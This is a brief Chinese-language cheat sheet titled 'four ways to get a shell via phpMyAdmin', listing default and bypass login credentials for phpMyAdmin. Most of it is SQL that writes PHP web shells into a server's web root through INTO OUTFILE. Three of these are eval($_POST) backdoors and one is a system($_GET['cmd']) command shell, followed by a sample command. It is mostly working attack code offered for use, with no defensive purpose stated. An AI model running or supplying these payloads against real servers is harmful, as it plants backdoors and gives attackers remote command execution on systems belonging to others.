# phpmyadmin拿shell的四种方法

查看版本：test.php 或 phpinfo.php

默认账号密码：root rootz

万能帐号密码：'localhost'@'@" 密码空

**第一种方法：**

```
CREATE TABLE `mysql`.`darkmoon` (`darkmoon1` TEXT NOT NULL );
INSERT INTO `mysql`.`darkmoon` (`darkmoon1` ) VALUES ('<?php @eval($_POST[pass]);?>');
SELECT `darkmoon1` FROM `darkmoon` INTO OUTFILE 'd:/wamp/www/darkmoon.php';
DROP TABLE IF EXISTS `darkmoon`;
```

**第二种方法：**

```
Create TABLE moon (darkmoon text NOT NULL);
Insert INTO moon (darkmoon) VALUES('<?php @eval($_POST[pass]);?>');
select darkmoon from moon into outfile 'd:/wamp/www/darkmoon2.php';
Drop TABLE IF EXISTS moon;
```

**第三种方法：**

```
select '<?php @eval($_POST[pass]);?>'INTO OUTFILE 'd:/wamp/www/darkmoon3.php'
```

**第四种方法**

```
select '<?php echo \'<pre>\';system($_GET[\'cmd\']); echo \'</pre>\'; ?>' INTO OUTFILE 'd:/wamp/www/darkmoon4.php'

127.0.0.1/darkmoon4.php?cmd=net user
```